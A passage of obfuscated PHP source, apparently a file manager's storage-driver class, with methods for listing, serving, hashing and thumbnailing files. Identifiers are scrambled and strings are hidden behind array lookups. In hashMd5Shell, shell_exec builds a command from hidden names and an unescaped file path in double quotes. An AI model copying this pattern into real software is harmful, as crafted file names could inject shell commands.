$§–Ëî¹Ù[$şÍ÷Ğµ‚[76]]; } } } public function fileSubstr($ÊÀ‚”¼ˆ, $·×Üï´ß, $şÙÇø¥) { } public function listAll($µ²Şò†à) { } public function listAllMake($ÅàßíáŒ, &$‚†¤×öé) { $¡ä£Ëî‹ =& $_SERVER[Ã¶¡¶„æ]; check_abort_echo(); $”ï£™Î¨ = $this->listPath($ÅàßíáŒ, !0); if (!$”ï£™Î¨) { return; } $¥ìâ¥åµ = array_merge($”ï£™Î¨[$¡ä£Ëî‹[82]], $”ï£™Î¨[$¡ä£Ëî‹[83]]); foreach ($¥ìâ¥åµ as $õÕÌ¾¸) { $ÉÁ·ñÒ = $õÕÌ¾¸[$¡ä£Ëî‹[33]] == $¡ä£Ëî‹[75]; $—ìñ†À = array($¡ä£Ëî‹[84] => $õÕÌ¾¸[$¡ä£Ëî‹[84]], $¡ä£Ëî‹[75] => $ÉÁ·ñÒ); if (isset($õÕÌ¾¸[$¡ä£Ëî‹[76]])) { $—ìñ†À[$¡ä£Ëî‹[76]] = $õÕÌ¾¸[$¡ä£Ëî‹[76]]; } if (isset($õÕÌ¾¸[$¡ä£Ëî‹[85]])) { $—ìñ†À[$¡ä£Ëî‹[85]] = $õÕÌ¾¸[$¡ä£Ëî‹[85]]; } if (!$ÉÁ·ñÒ) { $‚†¤×öé[] = $—ìñ†À; continue; } $‚†¤×öé[] = $—ìñ†À; $©ââ¡»š = $õÕÌ¾¸[$¡ä£Ëî‹[84]]; $ö üëÙ· = $this->pathDriver; if (substr($õÕÌ¾¸[$¡ä£Ëî‹[84]], 0, strlen($ö üëÙ·)) == $ö üëÙ·) { $©ââ¡»š = substr($©ââ¡»š, strlen($ö üëÙ·)); } $this->listAllMake($©ââ¡»š, $‚†¤×öé); } } public function listAllSimple($®ß÷ıùô) { $ÒĞ¸½öÛ =& $_SERVER[Ã¶¡¶„æ]; $Íôâğ”ß = array(); $±üéÔ¤® = $this->listAll($®ß÷ıùô); $Àš·¹³² = $this->getPathOuter($®ß÷ıùô); foreach ($±üéÔ¤® as $Åû†ê) { $ìß¶ÌÙ… = $Åû†ê[$ÒĞ¸½öÛ[84]]; $íú‰ê±Ë = $Åû†ê[$ÒĞ¸½öÛ[84]]; if (isset($Åû†ê[$ÒĞ¸½öÛ[86]])) { $ìß¶ÌÙ… = $Åû†ê[$ÒĞ¸½öÛ[86]][$ÒĞ¸½öÛ[84]]; $Åû†ê[$ÒĞ¸½öÛ[76]] = $Åû†ê[$ÒĞ¸½öÛ[86]][$ÒĞ¸½öÛ[76]]; $Åû†ê[$ÒĞ¸½öÛ[85]] = $Åû†ê[$ÒĞ¸½öÛ[86]][$ÒĞ¸½öÛ[85]]; } else { $íú‰ê±Ë = substr($Åû†ê[$ÒĞ¸½öÛ[84]], strlen(get_path_father($Àš·¹³²))); $íú‰ê±Ë = $ÒĞ¸½öÛ[8] . ltrim($íú‰ê±Ë, $ÒĞ¸½öÛ[8]); } $Œ™Æ–´û = array($ÒĞ¸½öÛ[84] => $íú‰ê±Ë, $ÒĞ¸½öÛ[75] => $Åû†ê[$ÒĞ¸½öÛ[75]]); if (isset($Åû†ê[$ÒĞ¸½öÛ[76]]) && !$Åû†ê[$ÒĞ¸½öÛ[75]]) { $Œ™Æ–´û[$ÒĞ¸½öÛ[76]] = $Åû†ê[$ÒĞ¸½öÛ[76]]; } if (isset($Åû†ê[$ÒĞ¸½öÛ[85]])) { $Œ™Æ–´û[$ÒĞ¸½öÛ[85]] = $Åû†ê[$ÒĞ¸½öÛ[85]]; } if (!$Åû†ê[$ÒĞ¸½öÛ[75]]) { $Œ™Æ–´û[$ÒĞ¸½öÛ[87]] = $ìß¶ÌÙ…; } $Íôâğ”ß[] = $Œ™Æ–´û; } return $Íôâğ”ß; } public function upload($¼ê«÷·Ò, $´îò´àõ, $ø¥¼àµ‰ = false, $ÊùÜÓ¸ = REPEAT_REPLACE) { } public function uploadFileByID($€úåËâ×, $¿Øğ‘ºä, $é”œ¡úÀ) { } public function uploadFileByPath($Ïáéƒı, $Íø­ĞÏ£, $ÑÖµ•Æ = array()) { } public function isUploadServer() { $‡Ï€Âé =& $_SERVER[Ã¶¡¶„æ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $‡Ï€Âé[88]) { return !0; } return $GLOBALS[$‡Ï€Âé[6]][$‡Ï€Âé[89]][$‡Ï€Âé[90]]; } public function isFileOutServer() { $äù¹†ÙÅ =& $_SERVER[Ã¶¡¶„æ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $äù¹†ÙÅ[88]) { return !0; } return $GLOBALS[$äù¹†ÙÅ[6]][$äù¹†ÙÅ[89]][$äù¹†ÙÅ[91]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($™©—ë¹“) { $Ò´üıüŒ =& $_SERVER[Ã¶¡¶„æ]; if (!$this->isCdnHost()) { return $™©—ë¹“; } return str_replace(trim(get_url_root($™©—ë¹“), $Ò´üıüŒ[8]), trim($this->cdnHost, $Ò´üıüŒ[8]), $™©—ë¹“); } public function uploadLink($²¶¼Áä, $À¹Öá¶ = 0) { $¨âæš¾õ =& $_SERVER[Ã¶¡¶„æ]; if ($this->isUploadServer()) { return; } $ìîÒ†Êó = $this->getType(); if (!in_array($ìîÒ†Êó, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Éê«Ó¾Ù = 1024 * 1024 * 10; $›¨Â¾å¶ = $À¹Öá¶ <= $Éê«Ó¾Ù ? $¨âæš¾õ[92] : $¨âæš¾õ[93]; $°”ØàÙŸ = (!$À¹Öá¶ ? 1 : ceil($À¹Öá¶ / pow(1024, 3))) * 3600 * 4; $÷ÃáÔôÍ = $this->{$›¨Â¾å¶}($²¶¼Áä, $°”ØàÙŸ); if ($÷ÃáÔôÍ) { $÷ÃáÔôÍ[$¨âæš¾õ[94]] = $²¶¼Áä; $÷ÃáÔôÍ[$¨âæš¾õ[95]] = $ìîÒ†Êó; } return $÷ÃáÔôÍ; } public function uploadFormData($í˜†÷Ûİ, $°ş–ıüã = 3600) { } public function multiUploadFormData($í¤ü¼«é, $¼ÍñÃÁÁ = 3600) { } public function download($„â¸, $»ÁÏ‰) { } public function ext($ÛÁõÑì) { $™æÅöÌÔ =& $_SERVER[Ã¶¡¶„æ]; if (strpos($ÛÁõÑì, $™æÅöÌÔ[8]) === -1) { $£¸øÛ¹ = $ÛÁõÑì; } else { $£¸øÛ¹ = $this->pathThis($ÛÁõÑì); } $’ÍäÊâ… = $™æÅöÌÔ[12]; if (strstr($£¸øÛ¹, $™æÅöÌÔ[10])) { $’ÍäÊâ… = substr($£¸øÛ¹, strrpos($£¸øÛ¹, $™æÅöÌÔ[10]) + 1); $’ÍäÊâ… = strtolower($’ÍäÊâ…); } if (strlen($’ÍäÊâ…) > 3 && preg_match($™æÅöÌÔ[96], $’ÍäÊâ…, $˜‰èÜ°£)) { $’ÍäÊâ… = $™æÅöÌÔ[12]; } return $’ÍäÊâ…; } public function pathThis($ı¡Æ˜ë¤) { $ˆ‘Ïâì¯ =& $_SERVER[Ã¶¡¶„æ]; $ı¡Æ˜ë¤ = str_replace($ˆ‘Ïâì¯[97], $ˆ‘Ïâì¯[8], rtrim($ı¡Æ˜ë¤, $ˆ‘Ïâì¯[8])); $İÇ©ÔÏ = strrpos($ı¡Æ˜ë¤, $ˆ‘Ïâì¯[8]); if ($İÇ©ÔÏ === !1) { return $ı¡Æ˜ë¤; } return substr($ı¡Æ˜ë¤, $İÇ©ÔÏ + 1); } public function pathFather($İ±³Á•) { $’¯—ğ» =& $_SERVER[Ã¶¡¶„æ]; $İ±³Á• = str_replace($’¯—ğ»[97], $’¯—ğ»[8], rtrim($İ±³Á•, $’¯—ğ»[8])); $ñòÌ¾Ïœ = strrpos($İ±³Á•, $’¯—ğ»[8]); if ($ñòÌ¾Ïœ === !1) { return $’¯—ğ»[12]; } return substr($İ±³Á•, 0, $ñòÌ¾Ïœ + 1); } public function hashSimple($¼‹óˆ§¹) { $²ÀÔ¾¼ˆ =& $_SERVER[Ã¶¡¶„æ]; if (!$¼‹óˆ§¹) { return md5($²ÀÔ¾¼ˆ[12]); } $¤×¼æ´ = $this->size($¼‹óˆ§¹); $îüÏŠãÇ = 200; $ÛŸ§ŞäÌ = 50; if ($¤×¼æ´ <= $îüÏŠãÇ * $ÛŸ§ŞäÌ) { return $this->hashMd5($¼‹óˆ§¹) . $¤×¼æ´; } $Ä“¹âòÒ = intval($¤×¼æ´ / $ÛŸ§ŞäÌ); $ÒÚˆÏõ¡ = $²ÀÔ¾¼ˆ[12]; for ($°³‹†¡ = 0; $°³‹†¡ < $ÛŸ§ŞäÌ; $°³‹†¡++) { $ÒÚˆÏõ¡ .= $this->fileSubstr($¼‹óˆ§¹, $Ä“¹âòÒ * $°³‹†¡, $îüÏŠãÇ); } $ÒÚˆÏõ¡ .= $this->fileSubstr($¼‹óˆ§¹, $¤×¼æ´ - $îüÏŠãÇ, $îüÏŠãÇ); return md5($ÒÚˆÏõ¡) . $¤×¼æ´; } public static $md5Cache = array(); public function hashMd5($ïÈœ›Œš) { if (!$ïÈœ›Œš) { return md5($_SERVER[Ã¶¡¶„æ][12]); } $ïÈœ›Œš = $this->iconvSystem($ïÈœ›Œš); if (isset(self::$md5Cache[$ïÈœ›Œš])) { return self::$md5Cache[$ïÈœ›Œš]; } self::$md5Cache[$ïÈœ›Œš] = $this->hashMd5Shell($ïÈœ›Œš); if (!self::$md5Cache[$ïÈœ›Œš]) { self::$md5Cache[$ïÈœ›Œš] = @md5_file($ïÈœ›Œš); } return self::$md5Cache[$ïÈœ›Œš]; } private function hashMd5Shell($ã‘„Û¸º) { $úµ‹áµ° =& $_SERVER[Ã¶¡¶„æ]; if (!$ã‘„Û¸º) { return md5($úµ‹áµ°[12]); } if (!function_exists($úµ‹áµ°[98])) { return !1; } $ÁÛÙÂ»Ğ = array($úµ‹áµ°[99], $úµ‹áµ°[100]); $ ˜ÌûŸ… = Cache::get($úµ‹áµ°[101]); if (!$ ˜ÌûŸ…) { $êüı‡²» = BASIC_PATH . $úµ‹áµ°[102]; $¶ô– êÂ = md5_file($êüı‡²»); $ ˜ÌûŸ… = $úµ‹áµ°[103]; foreach ($ÁÛÙÂ»Ğ as $ĞéÔ¢Š) { $İ¨×‡Àı = shell_exec($ĞéÔ¢Š . "\40\x22{$êüı‡²»}\42"); if ($İ¨×‡Àı && substr(trim($İ¨×‡Àı), 0, 32) == $¶ô– êÂ) { $ ˜ÌûŸ… = $ĞéÔ¢Š; break; } } Cache::set($úµ‹áµ°[101], $ ˜ÌûŸ…, 3600); } if ($ ˜ÌûŸ… == $úµ‹áµ°[103]) { return !1; } $İ¨×‡Àı = shell_exec($ ˜ÌûŸ… . "\x20\42{$ã‘„Û¸º}\42"); $İ¨×‡Àı = str_replace($úµ‹áµ°[104], $úµ‹áµ°[12], $İ¨×‡Àı); return substr($İ¨×‡Àı, 0, 32); } public function link($Š£­í³Ì) { return $Š£­í³Ì; } public function fileOut($©‰è„¢, $İî‹ŠôÔ = false, $ê¥ããñÎ = false, $ÍçÒ‡Ö = '') { $ÊÊ´» =& $_SERVER[Ã¶¡¶„æ]; $this->cacheMethod(null, null); if (!$©‰è„¢ || !$this->exist($©‰è„¢)) { show_json(LNG($ÊÊ´»[105]), !1, $ê¥ããñÎ); } $áäØ¸“¦ = $this->getType() == $ÊÊ´»[106]; $ğ‘ûşÄµ = $GLOBALS[$ÊÊ´»[6]][$ÊÊ´»[89]][$ÊÊ´»[107]][$ÊÊ´»[108]]; $ŠîÓ»áÑ = (double) $GLOBALS[$ÊÊ´»[6]][$ÊÊ´»[89]][$ÊÊ´»[107]][$ÊÊ´»[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $ıõîÛË = $this->infoFull($©‰è„¢); $½­ß± = $ıõîÛË[$ÊÊ´»[76]]; $’ÃŠâÏ˜ = gmdate($ÊÊ´»[110], $ıõîÛË[$ÊÊ´»[85]]); $ÆËÍÛ¿è = $ê¥ããñÎ ? $ê¥ããñÎ : $this->iconvApp($ıõîÛË[$ÊÊ´»[32]]); $™Ê¢¤øà = 0; $Öõã±™ß = $½­ß± - 1; $ë”şÔâœ = $this->ext($ÆËÍÛ¿è); if (in_array($ë”şÔâœ, array($ÊÊ´»[111], $ÊÊ´»[112], $ÊÊ´»[113], $ÊÊ´»[114]))) { $ë”şÔâœ = $ÊÊ´»[115]; } if (in_array($ë”şÔâœ, array($ÊÊ´»[116]))) { $ë”şÔâœ = $ÊÊ´»[117]; } if (!$ÍçÒ‡Ö) { $ÍçÒ‡Ö = md5($’ÃŠâÏ˜ . $this->hashSimple($©‰è„¢)); } $ÍçÒ‡Ö = $ÊÊ´»[118] . $ÍçÒ‡Ö . $ÊÊ´»[118]; $å’×Œ¢õ = get_file_mime($ë”şÔâœ); $œşô—ğÛ = !0; $œşô—ğÛ = isset($_GET[$ÊÊ´»[119]]) ? !1 : !0; if ($İî‹ŠôÔ === !1 && !mime_support($å’×Œ¢õ)) { $å’×Œ¢õ = $ÊÊ´»[120]; } header($ÊÊ´»[121]); header($ÊÊ´»[122] . $å’×Œ¢õ); $ÚûÚ¡ˆ• = rawurlencode($ÆËÍÛ¿è); $ÚûÚ¡ˆ• = $ÊÊ´»[118] . $ÚûÚ¡ˆ• . $ÊÊ´»[123] . $ÚûÚ¡ˆ•; if ($İî‹ŠôÔ) { header($ÊÊ´»[124]); header($ÊÊ´»[125] . $ÚûÚ¡ˆ•); } else { if ($œşô—ğÛ) { header($ÊÊ´»[126] . $ÚûÚ¡ˆ•); } } header($ÊÊ´»[127] . gmdate($ÊÊ´»[110], time() + 3600 * 24 * 30) . $ÊÊ´»[128]); header($ÊÊ´»[129]); header($ÊÊ´»[130]); header($ÊÊ´»[131]); if (isset($_SERVER[$ÊÊ´»[132]]) && strtotime($_SERVER[$ÊÊ´»[132]]) == $ıõîÛË[$ÊÊ´»[85]]) { header($ÊÊ´»[133], !0, 304); die; } if (isset($_SERVER[$ÊÊ´»[134]]) && $_SERVER[$ÊÊ´»[134]] == $ÍçÒ‡Ö) { header($ÊÊ´»[135] . $ÍçÒ‡Ö, !0, 304); die; } header($ÊÊ´»[135] . $ÍçÒ‡Ö); header($ÊÊ´»[136] . $’ÃŠâÏ˜ . $ÊÊ´»[128]); header($ÊÊ´»[137] . $ÆËÍÛ¿è); header($ÊÊ´»[138]); header($ÊÊ´»[139] . $½­ß±); header($ÊÊ´»[140]); if (!$İî‹ŠôÔ && $ë”şÔâœ == $ÊÊ´»[141]) { if ($½­ß± > 1024 * 1024 * 5) { die; } $‹§¡š§î = $this->getContent($©‰è„¢); $‹§¡š§î = Html::clearSVG($‹§¡š§î); header($ÊÊ´»[142] . strlen($‹§¡š§î)); echo $‹§¡š§î; die; } $Ü½â¤ºÏ = strtolower($_SERVER[$ÊÊ´»[143]]); if ($áäØ¸“¦ && $Ü½â¤ºÏ && $ğ‘ûşÄµ) { if (strstr($Ü½â¤ºÏ, $ÊÊ´»[144])) { header($ÊÊ´»[145] . $©‰è„¢); } else { if (strstr($Ü½â¤ºÏ, $ÊÊ´»[146])) { header($ÊÊ´»[147] . $©‰è„¢); } else { if (strstr($Ü½â¤ºÏ, $ÊÊ´»[148])) { header($ÊÊ´»[149] . $©‰è„¢); } } } if ($ŠîÓ»áÑ) { header($ÊÊ´»[150] . $ŠîÓ»áÑ); } return; } if (isset($_SERVER[$ÊÊ´»[151]])) { if (preg_match($ÊÊ´»[152], $_SERVER[$ÊÊ´»[151]], $¨¬Ú€ë‘)) { $™Ê¢¤øà = intval($¨¬Ú€ë‘[1]); $™Ê¢¤øà = $™Ê¢¤øà <= 0 ? 0 : ($™Ê¢¤øà >= $Öõã±™ß ? $Öõã±™ß : $™Ê¢¤øà); if (!empty($¨¬Ú€ë‘[2])) { $«³ïñ»¸ = intval($¨¬Ú€ë‘[2]); $Öõã±™ß = $«³ïñ»¸ < $™Ê¢¤øà ? $™Ê¢¤øà : ($«³ïñ»¸ >= $Öõã±™ß ? $Öõã±™ß : $«³ïñ»¸); } } header($ÊÊ´»[153]); header("\x43\157\156\164\x65\x6e\164\55\122\141\156\x67\145\x3a\x20\x62\x79\x74\x65\163\40{$™Ê¢¤øà}\55{$Öõã±™ß}\x2f" . $½­ß±); } else { header($ÊÊ´»[154]); } header($ÊÊ´»[155]); $üÔ¬›ÅÔ = !0; if ($_SERVER[$ÊÊ´»[156]] == $ÊÊ´»[157] && $½­ß± > 1204 * 1024 * 1024 * 2) { $üÔ¬›ÅÔ = !1; } if ($üÔ¬›ÅÔ) { header($ÊÊ´»[158] . ($Öõã±™ß - $™Ê¢¤øà + 1)); } if ($_SERVER[$ÊÊ´»[159]] == $ÊÊ´»[160]) { return; } $”ŞÚÂÊÂ = 1024 * 100; $ë°ôÕ¤Ö = 0; if ($ŠîÓ»áÑ) { $ë°ôÕ¤Ö = intval(1000 * 1000 * ($”ŞÚÂÊÂ / $ŠîÓ»áÑ)); } while ($™Ê¢¤øà <= $Öõã±™ß) { $¨äÍ·ÅÓ = timeFloat(); check_abort(); $§­àÚÅ = $Öõã±™ß - $™Ê¢¤øà + 1; if ($§­àÚÅ <= $”ŞÚÂÊÂ) { $”ŞÚÂÊÂ = $§­àÚÅ; } echo $this->fileSubstr($©‰è„¢, $™Ê¢¤øà, $”ŞÚÂÊÂ); $™Ê¢¤øà += $”ŞÚÂÊÂ; if ($”ŞÚÂÊÂ == $§­àÚÅ) { $™Ê¢¤øà = $Öõã±™ß + 1; } if ($ë°ôÕ¤Ö) { $ÙÕ´¡‘ƒ = intval(1000 * 1000 * (timeFloat() - $¨äÍ·ÅÓ)); $ÈâÌÛŒò = $ë°ôÕ¤Ö - $ÙÕ´¡‘ƒ; if ($ÈâÌÛŒò > 5) { usleep($ÈâÌÛŒò); } } } } public function fileOutServer($ªö‹¸», $Ö”êÊß‰ = false, $‰ãÁ´Ö = false, $ãƒø‹Ö° = '') { $this->fileOut($ªö‹¸», $Ö”êÊß‰, $‰ãÁ´Ö, $ãƒø‹Ö°); } public function fileOutLink($ó˜äú‘) { header($_SERVER[Ã¶¡¶„æ][161] . $ó˜äú‘); die; } public function cacheMethod($‚²ãëØè, $÷óÙÜ—¦, $çığ¯é = null) { $¯£å„Ï¤ =& $_SERVER[Ã¶¡¶„æ]; static $‚ù¥êÒ® = array(); $Œ¶©Œ¶² = $÷óÙÜ—¦ ? ltrim($this->getPathOuter($÷óÙÜ—¦), $¯£å„Ï¤[8]) : $¯£å„Ï¤[12]; $Ûäš°‘² = $¯£å„Ï¤[162] . $‚²ãëØè . $¯£å„Ï¤[163] . rtrim($Œ¶©Œ¶², $¯£å„Ï¤[8]); if (is_null($‚²ãëØè)) { $‚ù¥êÒ® = array(); return; } if (is_null($÷óÙÜ—¦)) { foreach ($‚ù¥êÒ® as $Ûäš°‘² => $ß¶“ºí‹) { if (!strstr($Ûäš°‘², $¯£å„Ï¤[162] . $‚²ãëØè . $¯£å„Ï¤[164])) { continue; } unset($‚ù¥êÒ®[$Ûäš°‘²]); } return; } if (!is_null($çığ¯é)) { $‚ù¥êÒ®[$Ûäš°‘²] = $çığ¯é; return; } $ô¿óõÜá = isset($‚ù¥êÒ®[$Ûäš°‘²]) ? $‚ù¥êÒ®[$Ûäš°‘²] : null; if (!is_null($ô¿óõÜá)) { return $ô¿óõÜá; } $ô¿óõÜá = $this->{$‚²ãëØè}($÷óÙÜ—¦); $‚ù¥êÒ®[$Ûäš°‘²] = $ô¿óõÜá; return $ô¿óõÜá; } public function cacheMethodInfoSet($½®±ıˆ¹, $ñˆÆîóØ, $¬–¸÷áè = false) { $†‚ç£¾ˆ =& $_SERVER[Ã¶¡¶„æ]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($†‚ç£¾ˆ[165], $½®±ıˆ¹, $ñˆÆîóØ); $this->cacheMethod($†‚ç£¾ˆ[166], $½®±ıˆ¹, $ñˆÆîóØ ? !1 : !0); if (is_array($¬–¸÷áè)) { $this->cacheMethod($†‚ç£¾ˆ[167], $½®±ıˆ¹, $¬–¸÷áè); } } public function fileOutImage($ÜŒĞ–˜õ, $Å£ëšÉ = 250) { $¬Û‘ê¡È =& $_SERVER[Ã¶¡¶„æ]; set_timeout(); if (substr($ÜŒĞ–˜õ, 0, 4) == $¬Û‘ê¡È[148]) { $this->fileOutLink($ÜŒĞ–˜õ); } $±¼„šãƒ = $this->info($ÜŒĞ–˜õ); $†¡åã–¶ = $±¼„šãƒ[$¬Û‘ê¡È[32]]; $»×¢Êí¹ = !1; if (isset($GLOBALS[$¬Û‘ê¡È[168]]) && $GLOBALS[$¬Û‘ê¡È[168]][$¬Û‘ê¡È[84]] == $±¼„šãƒ[$¬Û‘ê¡È[84]]) { $Î‰ÅÙ = $GLOBALS[$¬Û‘ê¡È[168]][$¬Û‘ê¡È[169]]; if (!$±¼„šãƒ[$¬Û‘ê¡È[170]]) { $±¼„šãƒ[$¬Û‘ê¡È[170]] = $GLOBALS[$¬Û‘ê¡È[168]]; } if (isset($Î‰ÅÙ[$¬Û‘ê¡È[171]])) { if ($Î‰ÅÙ[$¬Û‘ê¡È[171]] <= $Å£ëšÉ && $Î‰ÅÙ[$¬Û‘ê¡È[172]] <= $Å£ëšÉ) { $»×¢Êí¹ = !0; } } $†¡åã–¶ = $±¼„šãƒ[$¬Û‘ê¡È[170]][$¬Û‘ê¡È[32]]; } if ($±¼„šãƒ[$¬Û‘ê¡È[76]] <= 1024 * 50 || $»×¢Êí¹ || !function_exists($¬Û‘ê¡È[173]) || $±¼„šãƒ[$¬Û‘ê¡È[174]] == $¬Û‘ê¡È[175]) { return $this->fileOut($ÜŒĞ–˜õ, !1, $†¡åã–¶); } if (isset($±¼„šãƒ[$¬Û‘ê¡È[170]][$¬Û‘ê¡È[176]])) { $ô¯²ĞëÕ = $±¼„šãƒ[$¬Û‘ê¡È[170]][$¬Û‘ê¡È[176]]; } else { if (isset($±¼„šãƒ[$¬Û‘ê¡È[170]][$¬Û‘ê¡È[177]])) { $ô¯²ĞëÕ = $±¼„šãƒ[$¬Û‘ê¡È[170]][$¬Û‘ê¡È[177]]; } } if (!$ô¯²ĞëÕ) { $ô¯²ĞëÕ = md5("{$±¼„šãƒ[$¬Û‘ê¡È[32]]}\137{$±¼„šãƒ[$¬Û‘ê¡È[84]]}\137{$±¼„šãƒ[$¬Û‘ê¡È[76]]}\137{$Å£ëšÉ}"); } $âûã­¿Ú = "{$ô¯²ĞëÕ}\137{$Å£ëšÉ}\x2e\x70\x6e\x67"; if (!($ğ«±—¹– = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $¬Û‘ê¡È[178]))) { $ŠÊÊ«˜‹ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $¬Û‘ê¡È[179]); } else { $ŠÊÊ«˜‹ = KodIO::make($ğ«±—¹–); } if ($ğ«±—¹– = IO::fileNameExist($ŠÊÊ«˜‹, $âûã­¿Ú)) { $¯Œ¿šâ‘ = KodIO::make($ğ«±—¹–); return IO::fileOut($¯Œ¿šâ‘, !1, $†¡åã–¶); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $¯Œ¿šâ‘ = DATA_THUMB . $âûã­¿Ú; del_file($¯Œ¿šâ‘); if (!@file_exists($¯Œ¿šâ‘)) { $óŞ…œ˜¾ = TEMP_FILES; if (!is_dir($óŞ…œ˜¾)) { mk_dir($óŞ…œ˜¾); } $ß¦ğ‡íø = $óŞ…œ˜¾ . $ô¯²ĞëÕ . $¬Û‘ê¡È[10] . $±¼„šãƒ[$¬Û‘ê¡È[174]]; if (!@file_exists($ß¦ğ‡íø)) { $ß¦ğ‡íø = $this->download($ÜŒĞ–˜õ, $ß¦ğ‡íø); } ImageThumb::createThumb($ß¦ğ‡íø, $¯Œ¿šâ‘, $Å£ëšÉ, $Å£ëšÉ * 10); } if (!file_exists($¯Œ¿šâ‘) || filesize($¯Œ¿šâ‘) < 100) { return @file_exists($ß¦ğ‡íø) ? IO::fileOut($ß¦ğ‡íø) : $this->fileOut($ÜŒĞ–˜õ); } if (!($ˆÉ¿ìË‘ = IO::move($¯Œ¿šâ‘, $ŠÊÊ«˜‹))) { return IO::fileOut($¯Œ¿šâ‘); } del_file($¯Œ¿šâ‘); IO::fileOut($ˆÉ¿ìË‘); } public function fileOutImageServer($©Ó–ğ§º, $Š–¨áúØ = 250) { $this->fileOutImage($©Ó–ğ§º, $Š–¨áúØ); } public function fileNameAuto($õšïËÛ, $˜–¾»éØ, $ä±Å¾ÏÌ = REPEAT_RENAME, $èÒ£éÙ£ = false) { $šĞÃı¥Ü =& $_SERVER[Ã¶¡¶„æ]; $åš‚ü¸¼ = $õšïËÛ === $šĞÃı¥Ü[12] ? $˜–¾»éØ : rtrim($õšïËÛ, $šĞÃı¥Ü[8]) . $šĞÃı¥Ü[8] . $˜–¾»éØ; if ($ä±Å¾ÏÌ == REPEAT_REPLACE || !$this->exist($åš‚ü¸¼) || $èÒ£éÙ£ && $ä±Å¾ÏÌ != REPEAT_RENAME_FOLDER) { return $˜–¾»éØ; } if ($ä±Å¾ÏÌ == REPEAT_SKIP) { return !1; } $ØÔšÚõü = $šĞÃı¥Ü[10] . get_path_ext($˜–¾»éØ); $ØÔšÚõü = $ØÔšÚõü == $šĞÃı¥Ü[10] || $èÒ£éÙ£ ? $šĞÃı¥Ü[12] : $ØÔšÚõü; $êÅ›¦Ïé = 1; $¶ÇÒŸ¨± = substr($˜–¾»éØ, 0, strlen($˜–¾»éØ) - strlen($ØÔšÚõü)); $ØºÂò = $¶ÇÒŸ¨± . "\x28{$êÅ›¦Ïé}\x29{$ØÔšÚõü}"; while ($this->exist(rtrim($õšïËÛ, $šĞÃı¥Ü[8]) . $šĞÃı¥Ü[8] . $ØºÂò)) { $ØºÂò = $¶ÇÒŸ¨± . "\x28{$êÅ›¦Ïé}\x29{$ØÔšÚõü}"; $êÅ›¦Ïé++; } return $ØºÂò; } private function fileNameAutoList($ÂÓ‡ì¸ü, $Ëæ÷§Øá, $åĞ…¶Œä = false) { $¶ ›ÅŞÂ =& $_SERVER[Ã¶¡¶„æ]; $áÔºÄÂ™ = $this->listPath($ÂÓ‡ì¸ü, !0); $áÔºÄÂ™ = array_merge($áÔºÄÂ™[$¶ ›ÅŞÂ[82]], $áÔºÄÂ™[$¶ ›ÅŞÂ[83]]); $ãúËÊ€î = array_to_keyvalue($áÔºÄÂ™, $¶ ›ÅŞÂ[12], $¶ ›ÅŞÂ[32]); $ó²€×†Ì = $¶ ›ÅŞÂ[10] . get_path_ext($Ëæ÷§Øá); $ó²€×†Ì = $ó²€×†Ì == $¶ ›ÅŞÂ[10] || $åĞ…¶Œä ? $¶ ›ÅŞÂ[12] : $ó²€×†Ì; $Ìó¨¿Š = substr($Ëæ÷§Øá, 0, strlen($Ëæ÷§Øá) - strlen($ó²€×†Ì)); $È÷Ç¥Îµ = $Ìó¨¿Š . "\x28\x30\x29{$ó²€×†Ì}"; for ($º€èè½Í = 1; $º€èè½Í <= count($ãúËÊ€î) + 1; $º€èè½Í++) { $È÷Ç¥Îµ = $Ìó¨¿Š . "\x28{$º€èè½Í}\x29{$ó²€×†Ì}"; if (!in_array_not_case($È÷Ç¥Îµ, $ãúËÊ€î)) { return $È÷Ç¥Îµ; } } return $È÷Ç¥Îµ; } public function listAllFiles($İıÂ‰İ‡, $¾ ¨÷“Ï, $”ù†É™ = array()) { $»¥şéÉ =& $_SERVER[Ã¶¡¶„æ]; if (empty($¾ ¨÷“Ï)) { return array(); } $‘šã‰ß² = array(); $İıÂ‰İ‡ = trim($İıÂ‰İ‡, $»¥şéÉ[8]); foreach ($¾ ¨÷“Ï as $ÏåÎÕõ’) { $à¶ÏÜé = ltrim(substr(trim($ÏåÎÕõ’, $»¥şéÉ[8]), strlen($İıÂ‰İ‡)), $»¥şéÉ[8]); $‘šã‰ß² = array_merge($‘šã‰ß², $this->slicePath($à¶ÏÜé)); } $‘šÜŸò• = array(); foreach (array_unique($‘šã‰ß²) as $ÏåÎÕõ’) { $»›Ëƒ¾­ = array($»¥şéÉ[84] => $this->getPathOuter($»¥şéÉ[8] . $İıÂ‰İ‡ . $»¥şéÉ[8] . $ÏåÎÕõ’), $»¥şéÉ[75] => 1, $»¥şéÉ[76] => 0); if (substr($ÏåÎÕõ’, -1) != $»¥şéÉ[8]) { $»›Ëƒ¾­[$»¥şéÉ[75]] = 0; $®ûãÃ÷Ï = $this->getPath($İıÂ‰İ‡ . $»¥şéÉ[8] . $ÏåÎÕõ’); $»›Ëƒ¾­[$»¥şéÉ[76]] = isset($”ù†É™[$®ûãÃ÷Ï]) ? $”ù†É™[$®ûãÃ÷Ï] : $this->size($®ûãÃ÷Ï); } $‘šÜŸò•[] = $»›Ëƒ¾­; } return $‘šÜŸò•; } public function slicePath($¬ˆôı¡º) { $’ÍÜ¡€ =& $_SERVER[Ã¶¡¶„æ]; $¿‡ãÎª = explode($’ÍÜ¡€[8], trim($¬ˆôı¡º, $’ÍÜ¡€[8])); $ñéŠí¹ˆ = 0; do { ++$ñéŠí¹ˆ; $¾—ùÙ‚¡[] = implode($’ÍÜ¡€[8], array_slice($¿‡ãÎª, 0, $ñéŠí¹ˆ)) . $’ÍÜ¡€[8]; } while ($ñéŠí¹ˆ < count($¿‡ãÎª)); $¾—ùÙ‚¡[count($¿‡ãÎª) - 1] = $¬ˆôı¡º; return $¾—ùÙ‚¡; } public function getHost() { $Äü‡ÇÖ• =& $_SERVER[Ã¶¡¶„æ]; $¡¸š¿¯½ = parse_url(trim($this->domain, $Äü‡ÇÖ•[8])); $¬îÍ™ = 